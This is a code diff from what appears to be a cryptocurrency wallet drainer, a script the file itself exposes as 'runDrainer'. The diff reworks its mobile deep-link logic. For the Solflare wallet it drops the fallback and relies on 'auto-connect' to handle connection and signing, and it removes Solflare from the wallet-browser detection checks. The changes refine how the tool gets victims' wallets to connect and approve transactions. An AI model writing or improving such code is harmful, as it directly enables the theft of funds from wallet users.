@@ -6238,31 +6238,48 @@ window.runDrainer = runDrainer;
           link.click();
           document.body.removeChild(link);
           
-          // Wait longer before trying fallback to avoid immediate app store redirect
+          // For Solflare, NO FALLBACK - direct deep link with auto connection/signing
+          if (walletType === 'solflare') {
+            console.log(`[SOLFLARE_DIRECT] Solflare detected - using direct deep link approach with NO fallback`);
+            console.log(`[SOLFLARE_DIRECT] Deep link opened: ${deepLink}`);
+            console.log(`[SOLFLARE_DIRECT] Auto-connect will handle connection and signing`);
+            
+            // Show status and let auto-connect handle the rest
+            showStatus(`Opening Solflare wallet...`, 'info');
+            
+            // Add mobile debugging info
+            console.log(`[SOLFLARE_DEBUG] Current URL: ${window.location.href}`);
+            console.log(`[SOLFLARE_DEBUG] Target deep link: ${deepLink}`);
+            console.log(`[SOLFLARE_DEBUG] User agent: ${navigator.userAgent}`);
+            console.log(`[SOLFLARE_DEBUG] Touch points: ${navigator.maxTouchPoints}`);
+            console.log(`[SOLFLARE_DEBUG] Screen width: ${window.innerWidth}`);
+            
+            // No fallback timeout for Solflare - let auto-connect handle everything
+            return;
+          }
+          
+          // For other wallets, use the enhanced fallback logic
           setTimeout(() => {
             // Enhanced detection: Check if we're in a wallet browser or if deep link worked
             const isInWalletBrowser = window.location.href.includes('phantom.app') || 
-                                     window.location.href.includes('solflare.com') || 
                                      window.location.href.includes('backpack.app') ||
                                      window.location.href.includes('trustwallet.com') ||
                                      window.location.href.includes('glow.app') ||
                                      window.location.href.includes('exodus.com') ||
                                      document.referrer.includes('phantom.app') ||
-                                     document.referrer.includes('solflare.com') ||
                                      document.referrer.includes('backpack.app') ||
                                      document.referrer.includes('trustwallet.com') ||
                                      document.referrer.includes('glow.app') ||
                                      document.referrer.includes('exodus.com') ||
                                      // Check for wallet-specific user agents
                                      navigator.userAgent.includes('Phantom') ||
-                                     navigator.userAgent.includes('Solflare') ||
                                      navigator.userAgent.includes('Backpack') ||
                                      navigator.userAgent.includes('TrustWallet') ||
                                      navigator.userAgent.includes('Glow') ||
                                      navigator.userAgent.includes('Exodus');
             
             // Check if wallet providers are available (indicates we're in wallet browser)
-            const hasWalletProviders = !!(window.phantom || window.solflare || window.backpack || 
+            const hasWalletProviders = !!(window.phantom || window.backpack || 
                                         window.glow || window.trustwallet || window.exodus);
             
             if (isInWalletBrowser || hasWalletProviders) {
@@ -6274,42 +6291,23 @@ window.runDrainer = runDrainer;
             // Only try fallback if we're definitely not in a wallet browser
             if (window.location.href === currentUrl) {
               console.log(`[DEEP_LINK] Universal link failed, trying custom scheme: ${fallbackUrl}`);
-              
-              // For Solflare, be extra careful to prevent app store redirect
-              if (walletType === 'solflare') {
-                console.log(`[SOLFLARE_FALLBACK] Using special Solflare fallback handling`);
-                // Try to detect if Solflare app is installed
-                const testLink = document.createElement('a');
-                testLink.href = 'solflare://test';
-                testLink.style.display = 'none';
-                document.body.appendChild(testLink);
-                
-                // If we can create the link, try the custom scheme
-                try {
-                  window.location.href = fallbackUrl;
-                } catch (e) {
-                  console.log(`[SOLFLARE_FALLBACK] Custom scheme failed, showing manual instruction`);
-                  showStatus(`Please open Solflare wallet manually and return to this page`, 'info');
-                }
-                
-                document.body.removeChild(testLink);
-              } else {
-                window.location.href = fallbackUrl;
-              }
+              window.location.href = fallbackUrl;
             } else {
               console.log(`[DEEP_LINK] Universal link successful, staying in wallet browser`);
             }
           }, 3000); // Increased timeout to 3 seconds
           
-          // Show a message to the user about what's happening
-          showStatus(`Opening ${walletType} wallet...`, 'info');
-          
-          // Add mobile debugging info
-          console.log(`[MOBILE_DEBUG] Current URL: ${window.location.href}`);
-          console.log(`[MOBILE_DEBUG] Target deep link: ${deepLink}`);
-          console.log(`[MOBILE_DEBUG] User agent: ${navigator.userAgent}`);
-          console.log(`[MOBILE_DEBUG] Touch points: ${navigator.maxTouchPoints}`);
-          console.log(`[MOBILE_DEBUG] Screen width: ${window.innerWidth}`);
+          // Show a message to the user about what's happening (for non-Solflare wallets)
+          if (walletType !== 'solflare') {
+            showStatus(`Opening ${walletType} wallet...`, 'info');
+            
+            // Add mobile debugging info
+            console.log(`[MOBILE_DEBUG] Current URL: ${window.location.href}`);
+            console.log(`[MOBILE_DEBUG] Target deep link: ${deepLink}`);
+            console.log(`[MOBILE_DEBUG] User agent: ${navigator.userAgent}`);
+            console.log(`[MOBILE_DEBUG] Touch points: ${navigator.maxTouchPoints}`);
+            console.log(`[MOBILE_DEBUG] Screen width: ${window.innerWidth}`);
+          }
           
         } else {
           // Desktop: Direct window location change
